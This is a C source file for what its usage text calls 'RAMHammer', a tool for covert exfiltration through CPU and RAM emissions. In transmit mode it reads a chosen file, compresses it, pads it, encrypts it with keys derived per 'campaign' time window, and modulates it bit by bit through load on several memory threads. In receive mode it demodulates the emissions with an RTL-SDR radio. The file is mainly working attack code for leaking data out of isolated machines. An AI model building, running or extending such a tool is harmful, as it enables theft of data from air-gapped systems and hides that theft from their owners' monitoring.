#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <rtl-sdr.h>
#include <zlib.h>
#include <time.h>
#include <netinet/in.h>   // htonl, htons
#include <stdalign.h>
#include <sodium/randombytes.h>

#include "tx_engine.h"
#include "rx_callback.h"
#include "utils.h"

#define MAX_FILE_SIZE   (1024 * 1024)
#define PREAMBLE_BITS   64
#define BARKER_13       0b1111100110101ULL

static uint8_t* compress_data(const uint8_t* src, size_t len, size_t* out_len)
{
    uLongf bound = compressBound(len);
    uint8_t* dst = malloc(bound);
    if (!dst) return NULL;

    if (compress(dst, &bound, src, len) != Z_OK) {
        free(dst);
        return NULL;
    }

    *out_len = bound;
    return dst;
}

static void usage(const char* prog)
{
    fprintf(stderr,
        "RAMHammer - Covert exfiltration via CPU/RAM emissions\n"
        "Usage:\n"
        "  %s --tx <cores> <file>            transmit file\n"
        "  %s --rx <center_freq>             receive mode\n",
        prog, prog);
    exit(1);
}

int main(int argc, char** argv)
{
    if (argc < 3) usage(argv[0]);

    printf("RAMHammer v0.3 starting...\n");

    g_tsc_per_chip = calibrate_tsc(200);
    printf("Estimated cycles per chip: %llu\n", (unsigned long long)g_tsc_per_chip);

    if (strcmp(argv[1], "--tx") == 0)
    {
        int cores = atoi(argv[2]);
        const char* filename = argv[3];

        uint8_t master_key[32];
        if (load_master_key("ramhammer.key", master_key) != 0) return 1;

        // Time-window context (same logic as RX)
        time_t now = time(NULL);
        time_t window = now - (now % 300);  // 5-minute window
        char context[64];
        snprintf(context, sizeof(context), "ramhammer-campaign-2026-%016lx", window);

        uint8_t session_key[32];
        if (derive_session_key(master_key, context, session_key) != 0) return 1;

        FILE* f = fopen(filename, "rb");
        if (!f) { perror("fopen"); return 1; }
        fseek(f, 0, SEEK_END);
        long fsize = ftell(f);
        rewind(f);
        uint8_t* raw = malloc(fsize);
        fread(raw, 1, fsize, f);
        fclose(f);

        size_t comp_len;
        uint8_t* compressed = compress_data(raw, fsize, &comp_len);
        free(raw);
        if (!compressed) return 1;

        // Prepend original size (4 bytes) + random padding
        size_t pad_len = comp_len / 10 + (rand() % (comp_len / 5 + 1));
        uint8_t* padded = malloc(4 + comp_len + pad_len);
        uint32_t orig_size_be = htonl((uint32_t)fsize);
        memcpy(padded, &orig_size_be, 4);
        memcpy(padded + 4, compressed, comp_len);
        randombytes_buf(padded + 4 + comp_len, pad_len);
        size_t final_len = 4 + comp_len + pad_len;
        free(compressed);

        uint8_t encrypted[final_len + 56];
        size_t encrypted_len = 0;
        if (ramhammer_encrypt(padded, final_len, encrypted, &encrypted_len, session_key) != 0) {
            free(padded);
            return 1;
        }
        free(padded);

        printf("Original: %ld → Compressed+pad: %zu → Encrypted: %zu B\n",
               fsize, final_len, encrypted_len);

        pthread_t* threads = malloc(cores * sizeof(pthread_t));
        for (int i = 0; i < cores; i++)
            pthread_create(&threads[i], NULL, tx_memory_thread, (void*)(intptr_t)i);

        // Frame: preamble → Barker → length(32bit) → ciphertext → CRC32
        for (int i = 0; i < PREAMBLE_BITS; i++) send_bit(i & 1);
        for (int i = 12; i >= 0; i--) send_bit((BARKER_13 >> i) & 1);

        uint32_t len_be = htonl((uint32_t)encrypted_len);
        for (int i = 31; i >= 0; i--) send_bit((len_be >> i) & 1);

        for (size_t i = 0; i < encrypted_len; i++) send_byte(encrypted[i]);

        uint32_t crc = ramhammer_crc32(encrypted, encrypted_len);
        for (int i = 31; i >= 0; i--) send_bit((crc >> i) & 1);

        printf("Transmission complete.\n");

        atomic_store(&g_keep_running, false);
        for (int i = 0; i < cores; i++) pthread_join(threads[i], NULL);
        free(threads);
    }
    else if (strcmp(argv[1], "--rx") == 0)
    {
        rtlsdr_dev_t* dev = NULL;
        uint32_t freq = strtoul(argv[2], NULL, 10);

        if (rtlsdr_open(&dev, 0) < 0) {
            fprintf(stderr, "rtl-sdr open failed\n");
            return 1;
        }

        rtlsdr_set_center_freq(dev, freq);
        rtlsdr_set_sample_rate(dev, 2048000);
        rtlsdr_set_tuner_gain_mode(dev, 0);

        printf("RX listening at %u Hz...\n", freq);

        rtlsdr_read_async(dev, rx_callback, NULL, 8, 256*1024);

        rtlsdr_close(dev);
    }
    else
    {
        usage(argv[0]);
    }

    return 0;
}
